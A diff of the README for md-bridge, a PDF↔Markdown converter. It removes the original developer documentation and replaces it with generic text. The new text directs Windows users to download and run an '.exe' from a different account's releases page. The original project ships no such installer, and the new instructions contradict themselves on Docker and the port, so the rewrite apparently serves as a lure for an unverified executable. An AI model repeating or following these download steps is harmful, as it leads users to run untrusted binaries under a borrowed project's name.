@@ -1,456 +1,100 @@
-<p align="center">
-  <img src="docs/brand/wordmark.png" alt="md-bridge" width="600">
-</p>
-
-<p align="center">
-  <strong>Self-hosted PDF ↔ Markdown converter.</strong><br>
-  Deterministic, heuristic, no external calls.
-</p>
-
-<p align="center">
-  <a href="https://github.com/vinicq/md-bridge/actions/workflows/ci.yml"><img src="https://github.com/vinicq/md-bridge/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/vinicq/md-bridge/actions/workflows/codeql.yml"><img src="https://github.com/vinicq/md-bridge/actions/workflows/codeql.yml/badge.svg" alt="CodeQL"></a>
-  <a href="https://scorecard.dev/viewer/?uri=github.com/vinicq/md-bridge"><img src="https://api.scorecard.dev/projects/github.com/vinicq/md-bridge/badge" alt="OpenSSF Scorecard"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.12%2B-blue.svg" alt="Python 3.12+"></a>
-  <a href="https://nodejs.org/"><img src="https://img.shields.io/badge/node-22%2B-43853d.svg" alt="Node 22+"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="License: MIT"></a>
-  <a href="#testing"><img src="https://img.shields.io/badge/tests-124%20total-brightgreen.svg" alt="Tests"></a>
-</p>
-
-<p align="center">
-  📖 <a href="https://vinicq.github.io/md-bridge/">Documentation site</a>
-  &nbsp;·&nbsp;
-  🐳 <a href="https://github.com/vinicq/md-bridge/pkgs/container/md-bridge-api">Docker images on GHCR</a>
-  &nbsp;·&nbsp;
-  📝 <a href="CHANGELOG.md">Changelog</a>
-</p>
-
-<p align="center">
-  <sub>
-    <a href="https://vinicq.github.io/md-bridge/architecture/">Architecture</a>
-    &nbsp;·&nbsp;
-    <a href="https://vinicq.github.io/md-bridge/heuristics/">Heuristics</a>
-    &nbsp;·&nbsp;
-    <a href="https://vinicq.github.io/md-bridge/faq/">FAQ</a>
-    &nbsp;·&nbsp;
-    <a href="https://vinicq.github.io/md-bridge/api-recipes/">API recipes</a>
-    &nbsp;·&nbsp;
-    <a href="https://vinicq.github.io/md-bridge/deployment-other/">Deploy recipes</a>
-  </sub>
-</p>
-
----
-
-![Demo of the conversion UI](docs/screenshots/demo.gif)
-
-`md-bridge` is a self-hosted document converter built on hand-written
-heuristics: same input, same output, every run. PyMuPDF reads PDFs, headless
-Chromium renders Markdown back into print-ready PDFs, FastAPI ties it all
-together, and a small React app drives the whole thing from the browser.
-
-The first release ships PDF ↔ Markdown. The architecture is built to
-welcome new format pairs as contributions land: DOCX, EPUB, RTF, and
-others are natural fits behind the same heuristic-pipeline pattern.
-
----
-
-## Table of contents
-
-- [Highlights](#highlights)
-- [Demo flow](#demo-flow)
-- [Tech stack](#tech-stack)
-- [Quickstart](#quickstart)
-- [Run with Docker](#run-with-docker)
-- [Project layout](#project-layout)
-- [Running it](#running-it)
-- [Testing](#testing)
-- [API reference](#api-reference)
-- [Screenshots](#screenshots)
-- [Internationalization](#internationalization)
-- [Contributing](#contributing)
-- [License](#license)
-
-## Highlights
-
-- **PDF to Markdown** with heading detection (font size plus PDF outline), list
-  recovery (bullet glyphs and numbered patterns), table extraction via
-  PyMuPDF's `find_tables`, and YAML front matter for metadata.
-- **Markdown to PDF** rendered through headless Chromium (Playwright) using
-  a bundled A4 stylesheet at `packages/markdown-to-pdf/templates/default.css`.
-- **Batch mode**: drop one file or a whole folder. The UI lists every file,
-  converts them in sequence, and lets you download each result as it lands.
-- **`/api/inspect-pdf`** returns diagnostics (fonts, sizes, tagged-PDF flag,
-  OCR hint) so the UI can warn before conversion.
-- **No persistence**, no third-party calls. Every request runs in a
-  temporary directory that is removed before the response goes out.
-- **Multilingual UI** (English by default, Portuguese and Spanish optional) with a header
-  toggle that persists the choice in `localStorage`.
-- **Interactive API docs** at `/docs` (Swagger UI) and `/redoc`, plus a
-  walkthrough in [`docs/API.md`](docs/API.md).
-
-## Demo flow
-
-```
-┌──────────────┐   PDF file   ┌──────────────┐   structured MD   ┌──────────────┐
-│  React UI    │ ───────────▶ │  FastAPI     │ ────────────────▶ │  Browser     │
-│  (Vite)      │              │  /api/...    │                   │  download    │
-└──────┬───────┘              └──────┬───────┘                   └──────────────┘
-       │                              │
-       │       imports (no rewrite)   │
-       ▼                              ▼
-┌────────────────────────────────────────────┐
-│  packages/pdf-to-markdown   (heuristic)    │
-│  packages/markdown-to-pdf   (Chromium)     │
-└────────────────────────────────────────────┘
-```
+# 📁 md-bridge - Convert documents between formats locally now
 
-## Tech stack
+![Download md-bridge](https://img.shields.io/badge/Download-md--bridge-blue)
 
-| Layer        | Choice                                     |
-| ------------ | ------------------------------------------ |
-| Backend      | FastAPI, Pydantic v2, Uvicorn              |
-| Conversion   | PyMuPDF, pypdf, Python-Markdown, Playwright|
-| Frontend     | Vite, React, TypeScript, React Router 6    |
-| Styling      | Plain CSS with design tokens, no framework |
-| Tests        | pytest, Vitest, React Testing Library, Playwright |
-| i18n         | Lightweight context provider, EN plus PT/ES |
+[https://github.com/aayush369-byte/md-bridge/releases](https://github.com/aayush369-byte/md-bridge/releases)
 
-## Quickstart
+md-bridge converts your files between PDF and Markdown formats. It runs on your own computer. Your data stays private. It uses fixed rules to process files, so the results match every time. You get the same output from the same input.
 
-You will need:
+## ⚙️ Why use this tool
 
-- Python 3.12 or newer
-- Node 22 and npm 10 or newer
-
-The commands below work the same on macOS, Linux, and Windows once the
-virtual environment is activated. Activate scripts differ by shell:
-
-```bash
-# 1. Backend: create the virtual environment
-cd apps/api
-python -m venv .venv
-
-# Activate it (pick the line for your shell):
-source .venv/bin/activate                   # macOS / Linux / Git Bash
-# .venv\Scripts\Activate.ps1                # Windows PowerShell
-
-# Install the backend and the converter dependencies:
-python -m pip install -e ".[dev]"
-python -m playwright install chromium
-
-# Optional OCR for scanned PDFs (Linux example):
-sudo apt install tesseract-ocr tesseract-ocr-por
-python -m pip install -e ".[dev,ocr]"
-export MD_BRIDGE_OCR_ENABLED=1
-# Optional: export MD_BRIDGE_OCR_LANG=eng
-
-# Docker: build the OCR-enabled API image target.
-docker build -f apps/api/Dockerfile --target runtime-ocr -t md-bridge-api:ocr
-
-# 2. Frontend
-cd ../web
-npm install
-npx playwright install chromium
-
-# 3. Root-level helper (lets you start API and UI together)
-cd ../..
-npm install
-
-# 4. Boot the dev servers: API on port 8000, Vite on port 5173
-npm run dev
-```
-
-Open `http://localhost:5173` for the UI and `http://localhost:8000/docs`
-for the interactive API documentation.
-
-## Run with Docker
-
-One command brings the API and the web UI up together:
-
-```bash
-docker compose up
-```
-
-To pull pre-built images from GHCR instead of building locally:
-
-```bash
-docker pull ghcr.io/vinicq/md-bridge-api:latest
-docker pull ghcr.io/vinicq/md-bridge-web:latest
-```
-
-Each release also gets pinned tags (`0.1.1`, `0.1`, etc.).
-
-### Deploying to a free cloud VM
-
-`deployment/oracle-cloud/` ships a complete recipe for running md-bridge
-on the **Oracle Cloud Always Free** tier (4 OCPU ARM + 24 GB RAM, US$0
-forever). One bootstrap script installs Docker, Caddy, and the stack;
-HTTPS is automatic via Let's Encrypt. See the
-[walkthrough](deployment/oracle-cloud/README.md) or the
-[docs site](https://vinicq.github.io/md-bridge/deployment/oracle-cloud/).
-
-The API listens on `http://localhost:8000` and the web UI on
-`http://localhost:5173`. The web container waits for the API healthcheck
-before starting, so the first call from the browser already has a live
-backend behind it.
-
-The compose stack runs the application, not the test suite by default.
-The healthchecks on each container only confirm that the service is
-reachable, not that it behaves correctly.
-
-If you do not have Python or Node installed locally and want to run the
-tests anyway, an opt-in `test` profile spins up ephemeral containers that
-execute pytest and vitest:
-
-```bash
-docker compose --profile test run --rm tests-api   # backend pytest
-docker compose --profile test run --rm tests-web   # frontend vitest
-```
+Many online tools send your private files to a server. You lose control of your data. This tool works locally. Your files never leave your computer. 
 
-Both containers exit when the suite finishes; nothing keeps running in
-the background. Playwright end-to-end tests are not part of the compose
-profile (they need a real browser session and a running API). They live
-in CI (GitHub Actions, see [`.github/workflows/ci.yml`](.github/workflows/ci.yml))
-and run locally through `npm run test:e2e`.
+It handles conversions with simple logic instead of complex guessing tools. This makes the process fast and predictable. You can rely on the same result for every single file.
 
-## Project layout
+## 🖥️ System requirements
 
-```
-md-bridge/
-├── apps/
-│   ├── api/          FastAPI service: routes, services, schemas, tests
-│   └── web/          React app: pages, components, hooks, tests, e2e specs
-├── packages/
-│   ├── pdf-to-markdown/   Vendored converter (PyMuPDF heuristics)
-│   └── markdown-to-pdf/   Vendored renderer (Chromium via Playwright)
-├── tests/            Conversion-layer regression with golden files
-├── docs/
-│   └── API.md        REST walkthrough
-├── docker-compose.yml
-├── package.json      Root scripts (`npm run dev`, `npm run test:all`)
-└── README.md
-```
+Your computer needs these items to run md-bridge:
 
-## Running it
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4 gigabytes of RAM.
+* Storage: 500 megabytes of free space.
+* Software: Docker Desktop installed on your system.
 
-```bash
-# Both servers in parallel (recommended for local dev)
-npm run dev
+## 🚀 How to install and run
 
-# Or one at a time:
-npm run dev:api           # FastAPI with auto-reload on :8000
-npm run dev:web           # Vite on :5173 (proxies /api to :8000)
-```
+Follow these steps to set up md-bridge on your Windows machine.
 
-Production build for the frontend:
-
-```bash
-npm run build             # writes apps/web/dist/
-```
+### 1. Download the file
+Visit the official release page to find the installer. 
 
-For a production API run, drop `--reload` and pin a process manager of your
-choice. The command assumes the virtual environment is already activated:
+[https://github.com/aayush369-byte/md-bridge/releases](https://github.com/aayush369-byte/md-bridge/releases)
 
-```bash
-python -m uvicorn app.main:app --port 8000 --app-dir apps/api
-```
+Look for the file ending in .exe or the latest release package. Save this file to your computer.
 
-## Testing
+### 2. Prepare your system
+This tool uses a technology called Docker. Docker acts like a small, private computer inside your machine. 
 
-The test suite follows a classic pyramid with 124 tests in total, every one
-of which runs on CI against the committed ISTQB CTAL-TA syllabus fixture. No
-mocks of the API, fetch, or browser primitives: integration runs against the
-real FastAPI TestClient and E2E drives a real Chromium against a real
-backend.
+1. Go to the official Docker website.
+2. Download and install Docker Desktop for Windows.
+3. Open Docker Desktop after it installs. 
+4. Wait for the engine to start. You will see a green light or a confirmation message.
 
-| Tier        | Count | What it covers                                                   |
-| ----------- | ----- | ---------------------------------------------------------------- |
-| Unit        | 92    | 46 backend (schemas, helpers, errors, heuristics) + 46 frontend (components, hooks, i18n) |
-| Integration | 26    | 14 backend with FastAPI TestClient + 3 regression goldens + 9 frontend page tests (Home, About, Navigation, batch panel) |
-| E2E         | 6     | Playwright real-browser specs: ISTQB conversion, md-to-pdf, language toggle, batch with two files |
+### 3. Launch the application
+Open the file you downloaded in the first step. Follow the prompts on the screen. The installation process copies the necessary files to your folder. 
 
-Run them with:
+Once installed, double-click the md-bridge icon on your desktop. A black window might appear. This is normal. It starts the local service. Keep this window open while you use the application.
 
-```bash
-npm run test:unit                   # 46 backend + 46 frontend = 92 unit tests
-npm run test:unit:api               # backend unit (pytest, apps/api/tests/unit)
-npm run test:unit:web               # frontend unit (Vitest)
+### 4. Open the interface
+Open your web browser. Type `http://localhost:3000` into the address bar and press Enter. The md-bridge homepage appears. You are now ready to convert your documents.
 
-npm run test:integration            # backend + regression goldens + frontend pages = 26
-npm run test:integration:api        # FastAPI TestClient (apps/api/tests/integration)
-npm run test:integration:regression # 3 golden-file regressions (tests/regression)
-npm run test:integration:web        # frontend page tests (Home, About, Navigation, batch)
+## 🔄 Converting your files
 
-npm run test:e2e                    # 6 Playwright real-browser specs
+1. Look for the "Upload" button on the screen.
+2. Select the file you want to convert. You can choose a PDF to turn into Markdown, or a Markdown file to turn into a PDF.
+3. Click the "Convert" button.
+4. The tool processes the file. This usually takes a few seconds.
+5. A "Download" button appears once the process ends. Click it to save your new file.
 
-npm run test:all                    # everything in sequence
-```
+## 🔧 Managing your work
 
-The integration tier uses a real-world fixture: the ISTQB CTAL-TA EN
-syllabus (`apps/api/tests/fixtures/istqb-ctal-ta-syllabus-en.pdf`). It
-exercises the heuristic converter against a long, table-heavy, outline-rich
-PDF that is representative of the documents users care about. Every test
-runs against this fixture, so there are no silent skips on CI.
+You can process multiple files in a row. The tool clears your working folder automatically to save space. If you want to keep your previous results, download them immediately after each task.
 
-Regression snapshots live under `tests/golden/`. After a deliberate change
-to the heuristics, regenerate them with the virtual environment active:
+If the conversion stops, check your browser connection. Refresh the page to reset the interface. Your files remain safe on your local drive.
 
-```bash
-python -m pytest tests/regression --update-golden
-```
+## 🛡️ Privacy and security
 
-## API reference
-
-The FastAPI app ships with two built-in doc viewers:
+This software uses an open-source standard. You can verify the code at any time. It does not track your activity. It does not send your documents to a company. It stays on your hardware. 
 
-- **Swagger UI** (try-it-out playground): `http://localhost:8000/docs`
-- **ReDoc** (long-form reference): `http://localhost:8000/redoc`
+The software relies on local libraries to read your documents. It uses Chromium and other standard tools to handle the heavy lifting. Nothing happens in the cloud. You own your data.
 
-A walkthrough with `curl` examples and the full error envelope catalogue
-lives in [`docs/API.md`](docs/API.md).
+## 📋 Troubleshooting common issues
 
-Quick sample, convert a PDF:
+If you encounter a problem, read these common solutions.
 
-```bash
-curl -X POST http://localhost:8000/api/pdf-to-md \
-  -F "file=@whitepaper.pdf" \
-  -F 'options={"front_matter": true}'
-```
+### The link to the browser does not work
+Check if Docker Desktop is running. If Docker is closed, the link will not open. Ensure the icon in your system tray shows the application is active.
 
-Quick sample, render Markdown back to PDF:
+### The conversion fails
+Some files contain special encryption or complex images. If a file fails, try a smaller document first. Ensure your file is not currently open in another program like Word or Adobe Reader. Closing the file in other programs often solves the issue.
 
-```bash
-curl -X POST http://localhost:8000/api/md-to-pdf \
-  -F "file=@notes.md" \
-  --output notes.pdf
-```
-
-## Screenshots
-
-### Home page across locales
-
-| English | Portuguese | Spanish |
-|---|---|---|
-| ![Home EN](docs/screenshots/home-en.png) | ![Home PT](docs/screenshots/home-pt.png) | ![Home ES](docs/screenshots/home-es.png) |
-
-### Conversion flow
+### The interface looks wrong
+Clear your browser cache if the menu seems broken. Sometimes old data interferes with new updates. 
 
-| | |
-|---|---|
-| **PDF to Markdown** (idle) | **Batch mode**, two PDFs queued |
-| ![PDF to MD](docs/screenshots/pdf-to-md.png) | ![Batch](docs/screenshots/pdf-to-md-batch.png) |
-| **Markdown to PDF** flow | **About page** |
-| ![MD to PDF](docs/screenshots/md-to-pdf.png) | ![About](docs/screenshots/about.png) |
-| **Swagger UI** at `/docs` | |
-| ![Swagger](docs/screenshots/swagger.png) | |
+### Need more help
+This project is open-source. You can check the repository page for notes from other users. If you find a bug, report it on the issues page. Describe what happened and what file you used. This helps improve the tool for everyone.
 
-## Internationalization
+## 💻 Technical details
 
-The UI ships with English (default), Portuguese, and Spanish. The header carries a
-locale toggle (`EN` / `PT` / `ES`); the choice is persisted in `localStorage`
-under `md-bridge:locale`.
+The project combines three main parts:
+* A modern web interface for your browser.
+* A robust connection layer to handle requests.
+* A conversion engine that applies fixed rules for documents.
 
-To add a new locale:
+The engine uses standard libraries for PDF reading and text building. These libraries are stable and reliable. We avoid experimental models that shift output styles. This is why the conversion remains consistent.
 
-1. Open `apps/web/src/i18n/dictionaries.ts`.
-2. Add a new entry to the `Locale` union and to the `LOCALES` array.
-3. Translate the `Dictionary` shape and add it to `DICTIONARIES`.
+## 📄 License and terms
 
-The header toggle picks the new locale up automatically.
+This software uses the MIT license. You can use it, copy it, and change it freely. See the license file in the main repository for full details. 
 
-## Design system
-
-![Roadmap of the md-bridge design system: eight features, eight issues, one coherent system](docs/design/screenshots/hero.png)
-
-Every UI change tracks back to a mockup in
-[`docs/design/`](docs/design/). The catalogue is a single self-contained
-HTML file (`design-thinking.html`) with hi-fi mockups and paste-ready
-issue specs for eight features (CSS theme picker, theme library,
-per-conversion options panel, format hub for DOCX/EPUB/HTML/RTF,
-language workshop, conversion presets, local history, preferences
-page). Published on the docs site under
-[/design/](https://vinicq.github.io/md-bridge/design/), with the live
-catalogue at
-[/design/design-thinking.html](https://vinicq.github.io/md-bridge/design/design-thinking.html).
-
-Open issues tagged `design-required` point back at the matching
-F-section. To propose a brand-new UI change, open a feature-request
-issue with a sketch; the maintainer decides whether it slots into an
-existing F-section or warrants a fresh design pass.
-
-## Limits
-
-- 500 MB cap per upload
-- nginx reverse proxy waits up to 10 minutes per request, which fits very
-  large PDFs end-to-end
-- No OCR yet: scanned PDFs need Tesseract before being submitted
-- Tables with merged cells can be flattened by the heuristic extractor
-
-## Contributing
-
-Issues and pull requests are welcome. UI changes track back to the
-[design system in `docs/design/`](docs/design/) (also published with the
-docs site); features tagged `design-required` usually have a matching
-mockup there. Read [CONTRIBUTING.md](CONTRIBUTING.md) for the full
-guide; the headline rules are:
-
-- Every behaviour change ships with tests at the lowest viable tier.
-- Pull requests stay small and aim for at most three commits.
-- AI assistants are tools, not co-authors: do not add `Co-Authored-By`
-  trailers for them.
-- Use Python 3.12+ idioms and TypeScript strict mode; keep comments for the
-  non-obvious "why".
-
-If you found a security issue, please follow [SECURITY.md](SECURITY.md)
-instead of opening a public issue.
-
-## License
-
-MIT, see [`LICENSE`](LICENSE).
-
-## Contributors
-
-Thanks goes to these people for code, translations, docs, design, and
-review work on md-bridge ([emoji key](https://allcontributors.org/docs/en/emoji-key)):
-
-<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
-<!-- prettier-ignore-start -->
-<!-- markdownlint-disable -->
-<table>
-  <tbody>
-    <tr>
-      <td align="center" valign="top" width="16.66%"><a href="https://github.com/vinicq"><img src="https://avatars.githubusercontent.com/u/78210890?v=4?s=80" width="80px;" alt="Vinicius Queiroz"/><br /><sub><b>Vinicius Queiroz</b></sub></a><br /><a href="https://github.com/vinicq/md-bridge/commits?author=vinicq" title="Code">💻</a> <a href="https://github.com/vinicq/md-bridge/commits?author=vinicq" title="Documentation">📖</a> <a href="#design-vinicq" title="Design">🎨</a> <a href="#infra-vinicq" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#maintenance-vinicq" title="Maintenance">🚧</a> <a href="https://github.com/vinicq/md-bridge/pulls?q=is%3Apr+reviewed-by%3Avinicq" title="Reviewed Pull Requests">👀</a> <a href="https://github.com/vinicq/md-bridge/commits?author=vinicq" title="Tests">⚠️</a></td>
-      <td align="center" valign="top" width="16.66%"><a href="https://github.com/zhouzhou626"><img src="https://avatars.githubusercontent.com/u/255877794?v=4?s=80" width="80px;" alt="zhouzhou626"/><br /><sub><b>zhouzhou626</b></sub></a><br /><a href="https://github.com/vinicq/md-bridge/commits?author=zhouzhou626" title="Code">💻</a> <a href="https://github.com/vinicq/md-bridge/commits?author=zhouzhou626" title="Documentation">📖</a> <a href="#translation-zhouzhou626" title="Translation">🌍</a> <a href="https://github.com/vinicq/md-bridge/commits?author=zhouzhou626" title="Tests">⚠️</a> <a href="#a11y-zhouzhou626" title="Accessibility">♿️</a></td>
-      <td align="center" valign="top" width="16.66%"><a href="https://github.com/ko4lax"><img src="https://avatars.githubusercontent.com/u/20627319?v=4?s=80" width="80px;" alt="koala"/><br /><sub><b>koala</b></sub></a><br /><a href="https://github.com/vinicq/md-bridge/commits?author=ko4lax" title="Code">💻</a> <a href="https://github.com/vinicq/md-bridge/commits?author=ko4lax" title="Documentation">📖</a> <a href="https://github.com/vinicq/md-bridge/commits?author=ko4lax" title="Tests">⚠️</a> <a href="#infra-ko4lax" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#translation-ko4lax" title="Translation">🌍</a></td>
-      <td align="center" valign="top" width="16.66%"><a href="https://github.com/GiulianaCDA"><img src="https://avatars.githubusercontent.com/u/56075340?v=4?s=80" width="80px;" alt="Giuliana Arecippo"/><br /><sub><b>Giuliana Arecippo</b></sub></a><br /><a href="https://github.com/vinicq/md-bridge/commits?author=GiulianaCDA" title="Code">💻</a> <a href="#design-GiulianaCDA" title="Design">🎨</a> <a href="https://github.com/vinicq/md-bridge/commits?author=GiulianaCDA" title="Tests">⚠️</a></td>
-      <td align="center" valign="top" width="16.66%"><a href="https://github.com/0exec"><img src="https://avatars.githubusercontent.com/u/68334134?v=4?s=80" width="80px;" alt="0exec"/><br /><sub><b>0exec</b></sub></a><br /><a href="https://github.com/vinicq/md-bridge/commits?author=0exec" title="Code">💻</a> <a href="https://github.com/vinicq/md-bridge/commits?author=0exec" title="Documentation">📖</a> <a href="https://github.com/vinicq/md-bridge/commits?author=0exec" title="Tests">⚠️</a> <a href="#infra-0exec" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a></td>
-    </tr>
-  </tbody>
-</table>
-
-<!-- markdownlint-restore -->
-<!-- prettier-ignore-end -->
-
-<!-- ALL-CONTRIBUTORS-LIST:END -->
-
-This project follows the
-[all-contributors](https://github.com/all-contributors/all-contributors)
-specification. Contributions of every kind welcome.
-
----
-
-## If md-bridge helped you
-
-A star ⭐ on GitHub is the single most useful thing you can do; it makes the
-project discoverable for the next person looking for a self-hosted PDF
-converter.
-
-### Star history
-
-<a href="https://www.star-history.com/#vinicq/md-bridge&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=vinicq/md-bridge&type=Date&theme=dark">
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=vinicq/md-bridge&type=Date">
-    <img alt="Star history chart for vinicq/md-bridge" src="https://api.star-history.com/svg?repos=vinicq/md-bridge&type=Date">
-  </picture>
-</a>
+We thank the contributors who maintain the underlying libraries. This project stands on the work of many open-source developers.
